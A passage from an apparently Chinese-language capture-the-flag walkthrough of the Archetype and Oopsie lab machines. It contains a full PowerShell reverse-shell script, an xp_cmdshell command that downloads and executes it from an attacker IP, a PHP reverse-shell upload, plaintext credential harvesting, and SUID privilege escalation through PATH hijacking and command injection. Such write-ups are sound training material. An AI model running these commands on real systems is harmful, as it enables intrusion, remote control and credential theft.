</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] INFO(ARCHETYPE): Line <span style=color:#ae81ff>185</span>: Configuration <span style=color:#66d9ef>option</span> <span style=color:#e6db74>&#39;show advanced options&#39;</span> changed <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>to</span> <span style=color:#ae81ff>1</span>. Run the RECONFIGURE <span style=color:#66d9ef>statement</span> <span style=color:#66d9ef>to</span> install.
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] INFO(ARCHETYPE): Line <span style=color:#ae81ff>185</span>: Configuration <span style=color:#66d9ef>option</span> <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span> changed <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>to</span> <span style=color:#ae81ff>1</span>. Run the RECONFIGURE <span style=color:#66d9ef>statement</span> <span style=color:#66d9ef>to</span> install.
</span></span></code></pre></div><p>查看当前身份：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>xp_cmdshell <span style=color:#e6db74>&#34;whoami&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>结果</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>output</span>                                                                             
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>--------------------------------------------------------------------------------   
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>archetype<span style=color:#960050;background-color:#1e0010>\</span>sql_svc                                                                  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>NULL</span> 
</span></span></code></pre></div><p>查看是否存在开发环境：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>xp_cmdshell <span style=color:#e6db74>&#34;python&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>结果</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>output</span>                                                                             
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>--------------------------------------------------------------------------------   
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;python&#39;</span> <span style=color:#66d9ef>is</span> <span style=color:#66d9ef>not</span> recognized <span style=color:#66d9ef>as</span> an internal <span style=color:#66d9ef>or</span> <span style=color:#66d9ef>external</span> command,                     
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>operable program <span style=color:#66d9ef>or</span> batch file.                                                    
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>NULL</span> 
</span></span></code></pre></div><h2 id=3获取用户权限>3、获取用户权限<a hidden class=anchor aria-hidden=true href=#3获取用户权限>#</a></h2><p>根据之前<code>nmap</code>的扫描结果，靶机应该为<code>Windows Server 2008 R2</code>，在没有开发环境的情况下可以考虑从<code>powershell</code>入手，建立一个<code>powershell</code>的反向<code>shell</code>文件<code>1.ps1</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$client = New-Object System.Net.Sockets.TCPClient(<span style=color:#e6db74>&#34;10.10.14.62&#34;</span>,443);
</span></span><span style=display:flex><span>$stream = $client.GetStream();
</span></span><span style=display:flex><span><span style=color:#66d9ef>[byte[]]</span>$bytes = 0..65535|%{0};
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span>(($i = $stream.Read($bytes, 0, $bytes.Length)) <span style=color:#f92672>-ne</span> 0)
</span></span><span style=display:flex><span>{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
</span></span><span style=display:flex><span>$sendback = (iex $data 2&gt;&amp;1 | Out-String );
</span></span><span style=display:flex><span>$sendback2 = $sendback + <span style=color:#e6db74>&#34;# &#34;</span>;
</span></span><span style=display:flex><span>$sendbyte = (<span style=color:#66d9ef>[text.encoding]</span>::ASCII).GetBytes($sendback2);
</span></span><span style=display:flex><span>$stream.Write($sendbyte,0,$sendbyte.Length);
</span></span><span style=display:flex><span>$stream.Flush()};
</span></span><span style=display:flex><span>$client.Close()
</span></span></code></pre></div><p>保存完文件后，不要切换目录，在当前目录起一个<code>HTTP</code>服务器：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -m http.server <span style=color:#ae81ff>80</span>
</span></span></code></pre></div><p>开启本地监听：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc -lvvp <span style=color:#ae81ff>443</span>
</span></span></code></pre></div><p>在数据库中执行命令下载并执行脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>xp_cmdshell <span style=color:#e6db74>&#34;powershell &#34;</span>IEX (<span style=color:#66d9ef>New</span><span style=color:#f92672>-</span><span style=color:#66d9ef>Object</span> Net.WebClient).DownloadString(<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#e6db74>&#34;http://10.10.14.62/1.ps1\&#34;</span>);<span style=color:#e6db74>&#34;
</span></span></span></code></pre></div><p>下载成功后可以看到<code>Web服务器</code>和<code>nc</code>都有对应的连接信息，切换到<code>nc</code>窗口，回车发现拿到了靶机的<code>shell</code>交互：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># 查看当前用户身份</span>
</span></span><span style=display:flex><span>whoami
</span></span><span style=display:flex><span><span style=color:#75715e># 结果</span>
</span></span><span style=display:flex><span>archetype\sql_svc
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 查看当前路径</span>
</span></span><span style=display:flex><span>pwd
</span></span><span style=display:flex><span><span style=color:#75715e># 结果</span>
</span></span><span style=display:flex><span>Path               
</span></span><span style=display:flex><span>----               
</span></span><span style=display:flex><span>C:\Windows\system32
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 查看桌面文件</span>
</span></span><span style=display:flex><span>dir C:\Users\sql_svc\Desktop
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Directory<span style=color:#960050;background-color:#1e0010>:</span> C:\Users\sql_svc\Desktop
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name                                                                  
</span></span><span style=display:flex><span>----                -------------         ------ ----                                                                  
</span></span><span style=display:flex><span>-ar---        2/25/2020   6<span style=color:#960050;background-color:#1e0010>:</span>37 AM             32 user.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 查看user.txt</span>
</span></span><span style=display:flex><span>type C:\Users\sql_svc\Desktop\user.txt
</span></span></code></pre></div><h2 id=4提权>4、提权<a hidden class=anchor aria-hidden=true href=#4提权>#</a></h2><p>查看<code>powershell</code>历史记录：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 结果</span>
</span></span><span style=display:flex><span>net.exe use T: \\Archetype\backups /user<span style=color:#960050;background-color:#1e0010>:</span>administrator MEGACORP_4dm1n!!
</span></span><span style=display:flex><span>exit
</span></span></code></pre></div><p>发现<code>administrator</code>将文件夹<code>\Archetype\backups</code>映射到<code>T盘</code>，<code>MEGACORP_4dm1n!!</code>为密码。</p><p>尝试使用<code>impakcet</code>中的<code>psexec.py</code>提权：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 psexec.py administrator@10.10.10.27
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 连接信息</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Requesting shares on 10.10.10.27.....
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Found writable share ADMIN$
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Uploading file TPMzHnhC.exe
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Opening SVCManager on 10.10.10.27.....
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating service yQAe on 10.10.10.27.....
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting service yQAe.....
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Press help <span style=color:#66d9ef>for</span> extra shell commands
</span></span><span style=display:flex><span>Microsoft Windows <span style=color:#f92672>[</span>Version 10.0.17763.107<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2018</span> Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 查看当前身份</span>
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;whoami
</span></span><span style=display:flex><span>nt authority<span style=color:#ae81ff>\s</span>ystem
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 查看桌面目录</span>
</span></span><span style=display:flex><span>dir C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop
</span></span><span style=display:flex><span><span style=color:#75715e># 结果</span>
</span></span><span style=display:flex><span>Directory of C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>01/20/2020  06:42 AM    &lt;DIR&gt;          .
</span></span><span style=display:flex><span>01/20/2020  06:42 AM    &lt;DIR&gt;          ..
</span></span><span style=display:flex><span>02/25/2020  07:36 AM                <span style=color:#ae81ff>32</span> root.txt
</span></span><span style=display:flex><span>               <span style=color:#ae81ff>1</span> File<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>             <span style=color:#ae81ff>32</span> bytes
</span></span><span style=display:flex><span>               <span style=color:#ae81ff>2</span> Dir<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>  33,833,361,408 bytes free
</span></span><span style=display:flex><span>               
</span></span><span style=display:flex><span><span style=color:#75715e># 查看root.txt</span>
</span></span><span style=display:flex><span>type C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\r</span>oot.txt
</span></span></code></pre></div><h1 id=oopsie>Oopsie<a hidden class=anchor aria-hidden=true href=#oopsie>#</a></h1><blockquote><p>目标：拿到用户权限与系统权限。</p><p>靶机IP：10.10.10.28。</p></blockquote><h2 id=1信息收集-1>1、信息收集<a hidden class=anchor aria-hidden=true href=#1信息收集-1>#</a></h2><p><code>nmap</code>查看靶机信息：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -sS -sV 10.10.10.28
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 结果</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.28 <span style=color:#f92672>(</span>10.10.10.28<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.37s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed ports
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>开启22和80端口，直接访问网页，发现有一个登录关键字，但是没有对应的链接：</p><p><img loading=lazy src=https://cdn.jsdelivr.net/gh/oopsdc/PicBed@main/uPic/kVeKNC-20220820111658304.jpg alt=kVeKNC.jpg></p><p>可能是将登录页面隐藏了，可通过两种方法进一步挖掘：</p><p>1、<code>F12</code>打开控制台查看页面元素，翻到最下面可以发现一个登录页面的<code>js</code>脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/cdn-cgi/login/script.js&#34;</span>&gt;&lt;/<span style=color:#f92672>script</span>&gt;
</span></span></code></pre></div><p>2、<code>bp</code>抓包查看站点地图：</p><p><img loading=lazy src=https://cdn.jsdelivr.net/gh/oopsdc/PicBed@main/uPic/lf3bPf.jpg alt=lf3bPf></p><p>进入登录页面后尝试帐密<code>admin/MEGACORP_4dm1n!!</code>，密码为上一关获得的<code>administrator </code>的密码。</p><p>登录成功后有一个文件上传功能，点击后显示<code>当前行为需要超级管理员权限</code>，抓包看一下当前的请求包：</p><pre tabindex=0><code>GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1
Host: 10.10.10.28
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.28/cdn-cgi/login/admin.php
Connection: close
Cookie: user=34322; role=admin
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
</code></pre><p>发现<code>Cookie</code>处有一个<code>user</code>字段和<code>role</code>字段对当前身份进行判断，我们把当前数据包发送至<code>Inturder</code>模块，对<code>user</code>值爆破试试：</p><p><img loading=lazy src=https://cdn.jsdelivr.net/gh/oopsdc/PicBed@main/uPic/gpqdwF.jpg alt=gpqdwF></p><p>值为<code>86575</code>时，文件上传功能正常。</p><p>但是这样跑太费时间了，再回头看看其他页面，发现访问<code>Account</code>页面时<code>URL</code>如下：</p><pre tabindex=0><code>http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&amp;id=1
</code></pre><p><code>id</code>的值应该有一些用处，尝试修改为1、2、3、4，发现到4时回显另一个用户的信息，<code>bp</code>抓包放进<code>Intruder</code>跑一下：</p><p><img loading=lazy src=https://cdn.jsdelivr.net/gh/oopsdc/PicBed@main/uPic/FRRMAP.jpg alt=FRRMAP></p><p>同样获得了超级管理员的<code>Access ID</code>，接下来我们抓取访问文件上传页面的数据包，将<code>user</code>字段的值改为获取到的超级管理员的<code>Access ID</code>，转发后可成功进入文件上传页面，在选中文件后点击上传，再次修改转发包即可成功上传文件。</p><h2 id=2获取用户权限>2、获取用户权限<a hidden class=anchor aria-hidden=true href=#2获取用户权限>#</a></h2><p>上传文件后，下一步肯定需要知道文件的上传路径，使用<code>dirsearch</code>扫一下目录：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 dirsearch.py -u http://10.10.10.28/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 结果</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span> -  312B  - /uploads  -&gt;  http://10.10.10.28/uploads/
</span></span></code></pre></div><p>尝试上传一句话，蚁剑连接不上，使用<code>Kali</code>自带的<code>PHP</code>反弹<code>Shell</code>试试：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># 将自带Shell复制一份到当前目录</span>
</span></span><span style=display:flex><span>cp /usr/share/webshells/php/php-reverse-shell.php ./
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 修改IP和port为本机信息</span>
</span></span><span style=display:flex><span>$ip <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;本机IP&gt;&#39;</span>
</span></span><span style=display:flex><span>$port <span style=color:#f92672>=</span> &lt;监听端口&gt;
</span></span></code></pre></div><p>打开两个命令终端：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># 终端1，监听本机端口</span>
</span></span><span style=display:flex><span>nc -lvvp &lt;监听端口&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 终端2，请求1.php</span>
</span></span><span style=display:flex><span>curl http://10.10.10.28/uploads/1.php
</span></span></code></pre></div><p>运行完上述两条命令后，可以发现监听窗口反弹了一个<code>Shell</code>，权限为网站权限：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>切换到网站目录：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cd /var/www/html
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 通过ls命令查看当前目录文件，直到最终切换到/var/www/html/cdn-cgi/login目录，发现有如下文件</span>
</span></span><span style=display:flex><span>$ ls
</span></span><span style=display:flex><span>admin.php
</span></span><span style=display:flex><span>db.php
</span></span><span style=display:flex><span>index.php
</span></span><span style=display:flex><span>script.js
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 查看db.php</span>
</span></span><span style=display:flex><span>$ cat db.php
</span></span><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span>$conn <span style=color:#f92672>=</span> mysqli_connect<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;localhost&#39;</span>,<span style=color:#e6db74>&#39;robert&#39;</span>,<span style=color:#e6db74>&#39;M3g4C0rpUs3r!&#39;</span>,<span style=color:#e6db74>&#39;garage&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>?&gt;
</span></span></code></pre></div><p>我们得到了一个数据库的账号，接下来看看这个账号的信息：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ id robert             
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>robert<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>robert<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>robert<span style=color:#f92672>)</span>,1001<span style=color:#f92672>(</span>bugtracker<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>发现这个用户属于两个组，先查看一下这个用户的家目录：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ls /home/robert
</span></span><span style=display:flex><span>user.txt
</span></span></code></pre></div><p><code>user.txt</code>就是用户的<code>flag</code>，接下来获取<code>root</code>的<code>flag</code>。</p><h2 id=3提权>3、提权<a hidden class=anchor aria-hidden=true href=#3提权>#</a></h2><p>从<code>bugtracker</code>用户组入手，查找其是否拥有特殊权限：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ find -type f -group bugtracker 2&gt;/dev/null
</span></span></code></pre></div><p>命令没有回显，执行以下命令升级<code>Shell</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>SHELL<span style=color:#f92672>=</span>/bin/bash script -q /dev/null
</span></span></code></pre></div><p>继续执行之前的命令：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@oopsie:/$ find -type f -group bugtracker 2&gt;/dev/null
</span></span><span style=display:flex><span>find -type f -group bugtracker 2&gt;/dev/null
</span></span><span style=display:flex><span>./usr/bin/bugtracker
</span></span></code></pre></div><p>切换到<code>robert</code>用户：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@oopsie:/$ su - robert
</span></span></code></pre></div><p>查看<code>bugtracker</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>robert@oopsie:~$ ls -la /usr/bin/bugtracker
</span></span><span style=display:flex><span>ls -la /usr/bin/bugtracker
</span></span><span style=display:flex><span>-rwsr-xr-- <span style=color:#ae81ff>1</span> root bugtracker <span style=color:#ae81ff>8792</span> Jan <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2020</span> /usr/bin/bugtracker
</span></span></code></pre></div><p>发现其具有<code>s</code>权限，其作用在于用户可使用其所有者权限来运行程序，也就是说，在用户执行<code>bugtracker</code>程序时，将获取文件所有者，即<code>root</code>的权限及<code>UID</code>、<code>GID</code>。</p><p>运行<code>bugtracker</code>看看：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>robert@oopsie:~$ bugtracker
</span></span><span style=display:flex><span>bugtracker
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>------------------
</span></span><span style=display:flex><span>: EV Bug Tracker :
</span></span><span style=display:flex><span>------------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Provide Bug ID: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>---------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Binary package hint: ev-engine-lib
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Version: 3.3.3-1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Reproduce:
</span></span><span style=display:flex><span>When loading library in firmware it seems to be crashed
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>What you expected to happen:
</span></span><span style=display:flex><span>Synchronized browsing to be enabled since it is enabled <span style=color:#66d9ef>for</span> that site.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>What happened instead:
</span></span><span style=display:flex><span>Synchronized browsing is disabled. Even choosing VIEW &gt; SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
</span></span></code></pre></div><p>使用<code>strings</code>命令打印出可打印字符：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>robert@oopsie:~$ strings /usr/bin/bugtracker
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 发现命令调用</span>
</span></span><span style=display:flex><span>cat /root/reports/
</span></span></code></pre></div><p><code>bugtracker</code>调用了系统的<code>cat</code>命令输出位于<code>/root/reports</code>目录下的<code>bug</code>报告，且调用<code>cat</code>命令时并未使用绝对路径，即在当前用户的<code>$PATH</code>环境变量中有相应配置。</p><h3 id=方法一>方法一<a hidden class=anchor aria-hidden=true href=#方法一>#</a></h3><p>我们可以创建一个名为<code>cat</code>的恶意命令并修改当前用户<code>$PATH</code>值，让<code>bugtracker</code>调用恶意构造的命令，进一步获取<code>root</code>权限。具体思路为：</p><p>以<code>robert</code>的身份将<code>/tmp</code>目录设置为<code>$PATH</code>环境变量的第一个目录，然后切换到<code>/tmp</code>目录构造恶意<code>cat</code>命令并赋执行权，使<code>bugtracker</code>实际上调用了恶意构造的<code>cat</code>命令。</p><p>命令如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>robert@oopsie:~$ echo $PATH
</span></span><span style=display:flex><span>echo $PATH
</span></span><span style=display:flex><span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
</span></span><span style=display:flex><span>robert@oopsie:~$ export PATH<span style=color:#f92672>=</span>/tmp:$PATH
</span></span><span style=display:flex><span>export PATH<span style=color:#f92672>=</span>/tmp:$PATH
</span></span><span style=display:flex><span>robert@oopsie:~$ echo $PATH
</span></span><span style=display:flex><span>echo $PATH
</span></span><span style=display:flex><span>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
</span></span><span style=display:flex><span>robert@oopsie:~$ cd /tmp
</span></span><span style=display:flex><span>cd /tmp
</span></span><span style=display:flex><span>robert@oopsie:/tmp$ echo <span style=color:#e6db74>&#39;/bin/bash&#39;</span> &gt; cat
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#39;/bin/bash&#39;</span> &gt; cat
</span></span><span style=display:flex><span>robert@oopsie:/tmp$ chmod +x cat
</span></span></code></pre></div><p>再次运行<code>bugtracker</code>就会以<code>root</code>身份执行一个<code>shell</code>了。</p><h3 id=方法二推荐>方法二（推荐）<a hidden class=anchor aria-hidden=true href=#方法二推荐>#</a></h3><p>只需在运行<code>bugtracker</code>时输入如下命令：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>robert@oopsie:/tmp$ bugtracker
</span></span><span style=display:flex><span>bugtracker
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>------------------
</span></span><span style=display:flex><span>: EV Bug Tracker :
</span></span><span style=display:flex><span>------------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Provide Bug ID: 111;<span style=color:#e6db74>&#39;/bin/bash&#39;</span>
</span></span><span style=display:flex><span>111;<span style=color:#e6db74>&#39;/bin/bash&#39;</span>
</span></span><span style=display:flex><span>---------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cat: /root/reports/111: No such file or directory
</span></span></code></pre></div><p>此时便会以<code>root</code>身份执行一个<code>shell</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@oopsie:/tmp# id
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>robert<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>robert<span style=color:#f92672>)</span>,1001<span style=color:#f92672>(</span>bugtracker<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>查看<code>/root</code>目录下所有文件：</p><pre tabindex=0><code>root@oopsie:/tmp# ls -a /root
ls -a /root
.   .bash_history  .cache   .gnupg  .profile  root.txt  .viminfo
..  .bashrc        .config  .local  reports   .ssh
